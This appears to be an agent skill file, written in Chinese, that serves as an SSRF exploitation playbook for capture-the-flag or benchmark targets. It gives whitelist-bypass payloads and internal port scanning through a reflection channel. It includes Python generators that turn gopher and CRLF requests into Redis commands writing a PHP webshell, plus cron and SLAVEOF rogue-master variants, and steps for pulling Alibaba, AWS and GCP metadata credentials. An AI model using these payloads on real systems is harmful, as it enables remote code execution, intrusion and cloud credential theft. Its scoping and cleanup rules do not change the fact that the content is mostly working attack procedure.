---
name: ssrf-chain
description: >
  SSRF 从「能发请求」到「拿到执行」的利用链手册:反射信道三步(绑定→触发→读回显)、
  白名单绕过矩阵(过校验≠打到内网,每发先答两问:过校验?落点在哪?)、经反射信道
  做端口测绘与服务指纹、SSRF→Redis 写文件 RCE(gopher/CRLF 两路)、云 metadata
  (阿里云 token 流/AWS/GCP)、构建部署端点滥用。铁律:落点不明不发利用载荷;
  无出网,执行输出一律经反射信道取回;每步以回显字段判定,看到什么算什么。
---

# SSRF 利用链 — 过了校验 ≠ 打到了内网

实战锚点(本手册的形态模板,源自 2026-09 实弹):网关 `<绑定端点>` 只对 base_url
做后缀白名单(`<允许的后缀域名>`);`<触发端点>` 服务端发 GET,反射上游的
HTTP 状态 / JSON 解析结果 / body 截断文本。前缀注入、`0x7f000001`、
`2130706433`、`%2f` 编码、任意端口**全部通过校验**——但通配 DNS 把这些"本地域名"
全解析到同一个公网 IP,**localhost 不可直达**。教训:校验形同虚设 ≠ 打点成立。

```
拿到 SSRF 面 → §0 三问定信道:校验形态?触发端点?反射字段?
  → §2 选绕过变体,先判落点(§2.3 通配陷阱三步)——落点不明不发利用载荷
  → §3 测绘:端口优先序 × 响应指纹 → 锁定服务
  → §4(Redis→写文件 RCE)/ §5(metadata)/ §6(构建端点) 选配方逐步执行
  → 全程 §7 留痕;无出网,执行输出经反射取回
```

## 0. 信道判定三问(动手前必答)

**问 1:校验在哪一侧、什么形态?** 绑一发已知会过的(`http://<允许域>/`)和一发已知
形态越界的,比对拒绝信息。校验在 bind 侧(URL 字符串)最常见;校验在连接侧少见但存在
(绑得过、连不上也是白搭,whoami 一发就知道)。

| 症状(逐发探测) | 结论 | 能用的变体 |
|---|---|---|
| `http://0x7f000001/` 都过 | 校验接近没有,**落点是唯一战场** | 全部,重点 §2.3 |
| 只认后缀字样,`host.endswith(后缀)` | §2.1 前缀注入过校验,但落点=通配 DNS | §2.1 + §2.3 |
| 子串匹配(后缀出现在 URL 任意位置即过) | parser 差异类全开 | §2.1 + `@`/`#`/`%2f` |
| 拒 IP 字面量/内网段 | 黑名单形态 | §2.2 IP 形态 |
| 拒非 http(s) scheme | 逐个绑 `gopher://` `dict://` `file://` 确认 | 不拒=gopher 直达 §4.2 |

**问 2:触发端点有几个、能不能定方法?** bind+trigger 分离(实战形态)时,bind 存的
base_url 全局生效,一次只持有一条信道;扫端口/多步配方都要"重新 bind → 触发"。顺手记:
trigger 有没有 method 参数(有=能 PUT,§5 token 流就活)、有没有 header 参数、
超时是多少(端口探测的 oracle 基准)。

**问 3:反射什么?** 状态 / JSON / 预览文本 三个字段各自的语义与
截断长度。preview 截断阈值要探明:绑一个返回已知长 body 的端点,数 preview 字符数。
之后读长内容一律按此阈值分段(RCE 后用 `head -c` / `tail -c` 切片)。

## 1. 信道化三步

```
① 绑定   bind(base_url=URL)  → 响应即校验结果:过=存下;拒=记下拒绝文案(它是黑名单关键词表)
② 触发   whoami              → 服务端真实发起请求,挂起到上游返回或超时
③ 读反射 状态/JSON/预览文本 → 每步判定的唯一依据
```

### 1.1 用反射做端口探测(status/超时双 oracle)

对 `http://<落点>:<PORT>/` 逐端口走三步,同时记 whoami 调用耗时:

```bash
t0=$(date +%s%N); curl -s -m 12 "$GW<触发端点>" -o r.json; t1=$(date +%s%N)
echo "$(( (t1-t0)/1000000 ))ms"; cat r.json    # 每端口一条留档
```

| 观察(写死判定) | 结论 |
|---|---|
| status=2xx/3xx/4xx/5xx 且有 preview | 端口开且说 HTTP;按 §3.2 指纹定服务 |
| 秒回(<1s),status=连接错误类 | 端口关(refused) |
| 挂满 trigger 超时才报错 | 端口被滤(防火墙)或服务不回话;与"秒回报错"必须区分 |
| status 报错但 preview 里有 RESP 行(`-ERR` `+OK`)或二进制乱码 | 端口开但不是 HTTP → §3.2 指纹定服务(金矿) |
| preview 报 getaddrinfo/名称解析错 | 请求方没解你的编码,落点为空,回 §2 换变体 |

### 1.2 用反射读内容

- 内部服务出 JSON(ES/consul/docker/metadata 凭据)→ 完整落 `json` 字段,免费结构化读。
- 预览字段 截断 → 长内容走切片:RCE 后 `cmd=cat+flag*` 换 `cmd=head+-c+400+/flag`、
  `tail -c +401` 逐段;HTTP 读时换能分页的端点(ES `_search?size=`,docker logs `--tail`)。
- preview 是**渲染后的 body 片段**,不是原始响应:HTML 会吞标签,读源码类需求
  (如读 webshell 执行输出)优先让上游输出纯文本。

## 2. 白名单绕过矩阵(症状 → 变体 → 两问)

每个变体两问:**过校验?落点在哪?** 只答第一问就发利用载荷 = 事故。

### 2.1 后缀匹配类(校验看 host 形态/后缀)

| 变体 | URL 形态 | 过校验 | 落点判定 |
|---|---|---|---|
| 前缀注入 | `http://127.0.0.1.<允许后缀>/` | ✓(endswith/contains 都过) | 通配 DNS → 公网 IP,**不是** 127.0.0.1(§2.3 定真落点) |
| 编码斜杠 | `http://127.0.0.1%2f.<允许后缀>/` | ✓(校验看原串) | 请求方若解 %2f→host=`127.0.0.1`,路径=`.<后缀>`;不解→DNS 查失败(preview 报解析错) |
| `@` parser 差异 | `http://x.<允许后缀>@127.0.0.1:6379/` | ✓(contains 看后缀字样) | 合规 parser(requests/Go/net-url)连 `@` 后的真 host;preview 出 `-ERR` = 落 loopback 成立 |
| 碎片截断 | `http://127.0.0.1#x.<允许后缀>/` | contains ✓ | parser 把 `#` 后当 fragment → 连 127.0.0.1;校验若在提取后做则拒 |
| 多点/大小写 | `http://x.<后缀>.<后缀>/` `http://X.<后缀>/` | 看校验归不归一 | 与落点无关,纯过门变体 |
| 任意端口 | `:<PORT>` 拼在上面任何 host 后 | 实战确认不受限 | 端口测绘不受限(§3) |

### 2.2 IP 形态类(校验是 IP 黑名单时用;后缀白名单下这些**不含后缀会直接被拒**)

| 手法 | `127.0.0.1` 写法 | metadata 写法 |
|---|---|---|
| 短点分 | `127.1` `127.0.1` | — |
| 十进制整数 | `2130706433` | `2852039166`(169.254.169.254) |
| 十六进制 | `0x7f000001` `0x7f.0.0.1` | `0xa9fea9fe` |
| 八进制 | `0177.0.0.1` `017700000001` | `0251.0376.0251.0376` |
| 进制混拼 | `127.0x0.0.1` | — |
| 整段环回 | `127.2.3.4`(127/8 全是环回) | — |
| IPv4-mapped IPv6 | `[::ffff:127.0.0.1]` `[0::0:ffff:7f00:1]` | `[::ffff:169.254.169.254]` |
| `0` | `http://0/`(部分栈解析为本地) | — |

### 2.3 DNS 类:通配解析陷阱(实战核心,判定真实落点)

铁律:**绕过了校验 ≠ 打到了内网。**通配 DNS 下 `*.后缀` 全解析到同一公网 IP,
前缀注入只是让校验闭嘴,连接落点在公网。判定三步,逐步留档:

1. 绑 `http://<随机串>.<允许后缀>/` → whoami,存 preview=A;
   绑 `http://127.0.0.1.<允许后缀>/` → 存 preview=B。
   **A 与 B 逐字节相同 → 通配 catch-all 实锤**,前缀无语义,全部落公网 IP。
2. 攻击机 `dig +short 127.0.0.1.<允许后缀>` 得该公网 IP;经信道打
   `http://<该IP>:<已知应用端口>/` 与已知应用响应比对 → 确认该 IP 就是目标主机
   (单机部署常见:通配 IP 即网关宿主机)。
3. 经信道扫**该公网 IP** 的内网服务端口(§3 端口序):

| 观察 | 判定 | 下一步 |
|---|---|---|
| `<公网IP>:6379` 等通且指纹对 | 服务绑 0.0.0.0,**等效本地**,前缀注入够用 | 直接 §4,host 全部用公网 IP |
| `<公网IP>:PORT` 秒回 refused | 服务没起,或只绑了 127.0.0.1 | 上 loopback 手法(下表) |
| `<公网IP>:PORT` 挂超时 | 绑 127.0.0.1(或防火墙滤公网口) | 上 loopback 手法(下表) |

真 loopback 手法(按性价比排序):

| 手法 | 动作 | 判定 |
|---|---|---|
| `@` 差异(首选) | 绑 `http://x.<允许后缀>@127.0.0.1:6379/` | preview 出 RESP `-ERR` = 落点成立 |
| 重定向跟随 | §2.4 | preview 出目标内容 = 跟跳成立 |
| DNS rebinding | 见 §2.5,通常无 | — |

### 2.4 重定向跟随类

绑允许域内一个 302 端点,Location 指向 `http://127.0.0.1:<PORT>/`;服务端跟跳则落
loopback。**先小流量确认网关是否跟跳**:绑一个 302 到另一允许域 URL 的端点,
whoami preview 出现跳转目标的内容 = 跟跳;还是原 302 页面/报错 = 不跟,死路。
302 源:应用自身 open redirect(`?next=` `?url=` `/redirect?to=`)、允许域内
login/logout 端点、通配 app 的任意跳转行为。跳转目标的 host **不需要**过校验
(校验只看首跳)——这是它比 `@` 差异强的地方。

### 2.5 DNS rebinding(一句话)

需要自控权威域名(TTL=0,两次解析分别返回白名单 IP 与 127.0.0.1),benchmark 通常
没有;除非任务书给了可控域名,否则跳过,别在这上面烧请求配额。

## 3. 落点测绘

### 3.1 端口优先序(信道一秒一发,按序打,不全扫)

```
本机: 6379 3306 9200 8500 2375 11211 6379→(命中即停,转 §4)
      80 443 3000 5000 8000 8080 8081 8090 5432 27017 873 61616 9000
云:   100.100.100.200(阿里) 169.254.169.254(AWS/GCP)
内网: 172.17.0.x(docker bridge 首选)→ 172.16-31.x → 10.x → 192.168.x
      每段先打 1 个高存在感端口(80/8080)确认段活,再横向;不做 /16 全扫
```

### 3.2 服务指纹(看到什么算什么)

| 端口 | 发什么 | 看到什么 → 判定 |
|---|---|---|
| 6379 | `GET /` | preview 含 `-ERR unknown command` / `Wrong number of arguments` → **Redis 未授权**,转 §4 |
| 3306 | `GET /` | preview 二进制乱码中可读出版本串 `8.0.x` 或 `mysql_native_password` → MySQL |
| 9200 | `GET /` | json 字段有 `cluster_name` / `tagline: "You Know, for Search"` → Elasticsearch(9200 ES 常带任意读) |
| 8500 | `GET /v1/agent/self` | JSON 含 `Config` → Consul(读 KV: `/v1/kv/?keys`) |
| 2375 | `GET /version` | JSON 含 `ApiVersion`/`GoVersion` → **Docker API 裸奔**,等同 RCE:`GET /containers/json` 列容器,§6 同级证据纪律 |
| 11211 | `GET /` | preview 含 `STAT`/`ERROR` → memcached(`stats` 可再发) |
| 5432 | `GET /` | 乱码含 `PostgreSQL` 字样 → PostgreSQL |
| 27017 | `GET /` | preview 含 `It looks like you are trying to access MongoDB over HTTP` → MongoDB |
| 9000 | `GET /` | 无指纹秒断 → 疑 PHP-FPM fastcgi,GET-only 信道打不动,记下走人(有 gopher 另说) |
| 873 | `GET /` | preview 出 module 列表 → rsync 未授权 |
| 100.100.100.200 | `GET /latest/meta-data/` | 纯文本目录树 → 阿里云 metadata,转 §5 |
| 169.254.169.254 | `GET /latest/meta-data/` | 目录树 → AWS/GCP,转 §5 |

内网段扫描循环(模板,字段名按实际 API 调整):

```bash
WHITELIST=<允许的后缀域名>
for p in 6379 3306 9200 8500 2375 8080 80; do
  curl -s -m 8 -X POST "$GW<绑定端点>"  -d "base_url=http://<落点HOST>:$p/"   # 落点按 §2.3 判定结果填
  t0=$(date +%s%N); curl -s -m 12 "$GW<触发端点>" -o "evidence/port-$p.json"
  echo "$p $(( ($(date +%s%N)-t0)/1000000 ))ms"
done   # 逐条按 §1.1 表与 §3.2 指纹判,全部落 evidence/
```

## 4. SSRF→Redis→RCE 配方

前置:§3 已确认 6379 通、未授权(preview 出过 `-ERR`)。**落点必须已判定是真
loopback 或等效的 0.0.0.0 口**——打到通配 IP 上陌生的 6379(别人的服务)是事故。

### 4.1 先判工具箱

| 试什么 | 看到 | 走哪条 |
|---|---|---|
| bind `gopher://<落点>:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A` 不拒,whoami 后 preview/行为有变 | gopher 可用 | §4.2 一发入魂 |
| scheme 只认 http(s),但 URL 里 `%0d%0a` 请求方会解码 | CRLF 通道 | §4.3 逐条 |
| `%0d%0a` 被剥/被双重编码/客户端拒控制字符 | 只有探针没有写 | 换落点或换 §6/§5 目标 |

### 4.2 gopher 路(一发入魂)

生成器离线跑,**别手拼 RESP/URL 编码**:

```python
#!/usr/bin/env python3
# gen_gopher.py — Redis 写 webshell 的 gopher URL;WEBROOT/NAME 按 §4.4 判定替换
from urllib.parse import quote
def resp(*args):
    return ("*%d\r\n" % len(args)) + "".join("$%d\r\n%s\r\n" % (len(a), a) for a in args)
WEBROOT, NAME = "/var/www/html", "shell.php"
payload = (resp("CONFIG","SET","dir",WEBROOT) + resp("CONFIG","SET","dbfilename",NAME)
         + resp("SET","shell","\n\n<?php echo shell_exec($_GET['c']);?>\n\n") + resp("SAVE"))
print("gopher://<落点>:6379/_" + quote(payload, safe=""))
```

逐步判定(每步一发,看到才走下一步):

1. bind 生成 URL → whoami:status 报错但 preview 含 `+OK`/RESP 字节 = Redis 已执行。
2. 复核写盘:生成 `resp("CONFIG","GET","dir")` 版 → preview 回显 `/var/www/html` = 配置生效。
3. 验证落盘:经信道 `GET http://<落点>/shell.php?c=id` → preview 出 `uid=` = 链成。

### 4.3 无 gopher:CRLF 逐条路

原理:HTTP GET 打到 Redis 端口,请求行/头被当 inline 命令逐行报 `-ERR`,URL 路径里的
`%0d%0a` 被请求方解码后把我们的命令切成行混进去。**Redis 的 CONFIG SET/SET 跨连接
持久**——每条 whoami 一个连接也能攒齐三步,不要求一发全带。

```python
#!/usr/bin/env python3
# gen_crlf.py — 输出逐步注入 URL(inline 协议,双引号内 \n 转义为真换行)
from urllib.parse import quote
WEBROOT, NAME = "/var/www/html", "shell.php"
cmds = [
    "CONFIG SET dir " + WEBROOT,
    "CONFIG SET dbfilename " + NAME,
    'SET shell "\n\n<?php echo shell_exec($_GET[\'c\']);?>\n\n"',
    "SAVE",
]
for i, c in enumerate(cmds, 1):
    print(f"step{i}  http://<落点>:6379/x%0d%0a" + quote(c, safe="") + "%0d%0a")
```

- step1~4 逐发 bind+whoami;step1 后插发一发 `CONFIG GET dir` 探针确认配置吃到。
- `%0d%0a` 不解码(Redis 全是字面 `%` 报错)→ 试原始 CRLF 直接放 bind 串、双重编码
  `%250d%250a`;都不行 = 此路死,记档换向。
- SLAVEOF 变体:需要传二进制(恶意 `.so` MODULE LOAD)或 payload 带无法 inline 的
  字符时,攻击机内网 IP 起 rogue master 供恶意 RDB,目标侧两条命令
  `SLAVEOF <攻击机内网IP> 6379` + `CONFIG SET dir/dbfilename`,全量同步即写盘。
  无出网环境攻击机 IP 就是 VPN 内网 IP,可达;用完立刻 `SLAVEOF NO ONE` 收。

### 4.4 落点选择:webshell vs cron

| 条件 | webshell | cron |
|---|---|---|
| 判定 web 服务在且能定位 web 根 | ✓ 首选 | — |
| 需要回读输出(无出网必选) | ✓ 经 SSRF GET 回读 | ✗ 盲,基本只配 "有任务书明示" 时用 |
| web 根不明/不可写 | ✗ | ✓ cron 在跑时 |
| dir 候选(逐个试,`CONFIG GET dir` 先看原值) | `/var/www/html` `/usr/share/nginx/html` `/app` `/app/public` `<whoami 已知应用路径>` | `/var/spool/cron`(CentOS)/`/var/spool/crontabs`/`/var/spool/cron/crontabs`(Debian),`dbfilename=root` |

无出网铁律:**反弹 shell 型 cron(`bash -i >& /dev/tcp/...`)没有意义**(没人接,
还是违反无出网设定)。cron 只在能"把结果送到可经反射观察的位置"时才打,否则一律
webshell。cron 内容格式:`"\n\n*/1 * * * * cat /flag* > <web根>/out.txt\n\n"`,
再经信道 GET `/out.txt` 回读——本质仍是借 web 回读。

### 4.5 验证与收尾

1. `GET http://<落点>/shell.php?c=id` → preview 出 `uid=` = RCE 链成,立刻 §7 取证。
2. flag 定位:`c=find+/+-maxdepth+3+-name+'*flag*'+2>/dev/null`,再 `cat`;preview
   截断就 `head -c` / `tail -c` 切片(§1.2)。
3. 不驻留:取完 flag 即停;webshell 文件名记入 cleanup.md,任务书要求清理则
   `c=rm+/var/www/html/shell.php` 顺手删。

## 5. 云 metadata

判定在云里(旁证,满足其一即可试探):§3 打 `100.100.100.200/latest/meta-data/`
通;RCE 后 hostname 形如 `i-xxxx`(阿里)/`ip-x-x-x-x`(AWS)。

### 5.1 阿里云 ECS(100.100.100.200)

| 发 | 看到 | 判定 |
|---|---|---|
| `GET http://100.100.100.200/latest/meta-data/` | 纯文本目录树 | normal 模式,直读,走完下表 |
| 同上返回 403 | strict 模式 | 需先 `PUT /latest/api/token`(头 `X-aliyun-ecs-metadata-token: true`,TTL 头 `X-aliyun-ecs-metadata-token-refresh-tightness: 300`)→ **GET-only 信道发不了 PUT,死路**,换落点,别耗 |
| `GET /latest/meta-data/instance-id` | `i-xxxx` | 主机身份,最小证据之一 |
| `GET /latest/meta-data/ram/security-credentials/` | 角色名(纯文本,一行一个) | 有 RAM 角色,可取凭据 |
| `GET /latest/meta-data/ram/security-credentials/<ROLE>` | JSON 含 `AccessKeyId/AccessKeySecret/SecurityToken` | 完整落反射 `json` 字段——这就是经反射信道读 AK/SK 的完整请求;按 §7 脱敏留档 |

### 5.2 AWS / GCP 简表

| 云 | 端点 | 障碍 |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → role → 凭据 JSON | IMDSv2 要 `PUT /latest/api/token` + 头 `X-aws-ec2-metadata-token`;GET-only 信道同阿里云死路,先打裸读(很多实例仍 IMDSv1) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | 必须带头 `Metadata-Flavor: Google`。**头可以靠 CRLF 注入补**:`GET http://169.254.169.254/%0d%0aMetadata-Flavor:%20Google` 型路径(§4.3 同源原理),preview 出 token JSON = 成;解不了 = 死路 |

通用硬规则:**需要 PUT 方法或自定义头的流,先确认信道支持(method 参数/头参数/
CRLF 可解),不支持就放弃该云的 token 流,转打其他落点**——在三问(§0 问 2)时
就该确认,不是打到一半才试。

## 6. 构建/部署端点滥用模式(通用知识)

网关/CI 形态应用常有 `/api/compile` `/api/build` `/api/deploy` `/api/run` `/status`
`/builds` `/jobs` 类端点,鉴权常缺。探测序(先看后动,每步留档):

1. **只读摸底**:`GET /status` `/builds` `/jobs` `/tasks` `/api/tasks`——读历史日志
   回显:绝对路径、语言版本、执行命令模板、内部地址。这一步零副作用,信息量最大。
2. **定位执行环境**:从日志推断工作目录、跑哪个用户、有没有编译器/解释器、
   有没有内网可达性(日志里出现内部服务地址 = 有)。
3. **临时对象无害验证**:提交一个最小任务(内容只做 `echo <canary>; id; hostname;
   ls /`),从回显/日志判定:真的执行了?谁在跑?flag 路径可见性。**禁止**提交
   联网下载、反弹 shell、真实路径写入类内容。
4. **判定执行环境后按任务书取 flag**,与 §4.5 同标准。

安全边界(红线,违反即事故):

- 禁一切 delete/clean 端点(`DELETE /builds/<id>` 一类,一个都不发)。
- 禁部署/写入真实路径与共享路径;临时对象只用 `/tmp/<canary>` 形态。
- 验证完即收:删除临时对象,记入 cleanup.md。
- 拿到执行只取最小证据(`id` + `hostname` + flag 哈希),不驻留不横向,除非任务书明示。

## 7. 证据纪律

- **每步留档**:请求 URL + 完整反射响应(状态/JSON/预览文本)落
  `runs/<id>/evidence/ssrf/<ts>_<label>.json`,含时间戳。失败响应同样落——
  "此路不通"的判定记录是下一轮的情报。
- **拿到执行取最小证据**:`id` + `hostname` + flag 文件哈希即链路证明;命令输出
  最小化,不 `cat` 大文件刷屏,不列全盘目录。
- **凭据脱敏**:AK/SK/token 进档案只留前 6 后 4,完整值不进对话、不进 timeline 明文。
- **cleanup.md 逐条记录**:每个写入的文件(webshell/out.txt)、每次配置变更
  (Redis dir/dbfilename、SLAVEOF)加恢复命令(`SLAVEOF NO ONE`、`rm`、
  `CONFIG SET dir` 还原),任务书要求清理时逐项执行并验证。
- **不驻留不横向**:SSRF 链成的机器上不停留、不向内网二次渗透,除非任务书明示。

---

## 执行程序(逐条照做)

1. §0 三问:校验形态、触发端点与 method/header 支持、反射字段与截断阈值。写成三行笔记。
2. §2 选变体;**先跑 §2.3 落点判定三步**,落点不明不发任何利用载荷。
3. §3 测绘:端口序逐个打,命中指纹即停;判定结果落 evidence/。
4. 按命中服务选配方:Redis→§4、metadata→§5、构建端点→§6;每步判定条件"看到才走下一步"。
5. 链成即取最小证据、收尾、cleanup 记账;失败逐条记档,换向不恋战。

## 不要

- 没判落点就上重载荷(SLAVEOF/写文件/扣凭据)——通配 IP 上的 6379 可能是别人的服务。
- 手拼 RESP 与 URL 编码——用 §4 生成器,手拼必错转义。
- 无出网环境打反弹 shell 型 cron——没人接,纯浪费一发配额。
- 对同一变体重复发(同 waf-bypass 铁律):preview 没变化就是没生效,换下一行。
- 全网段乱扫——信道一秒一发,按 §3.1 优先序;扫 /16 是自嗨兼触发风控。
- GET-only 信道死磕 strict metadata 的 PUT token 流——三问时确认过 method 支持就定生死。
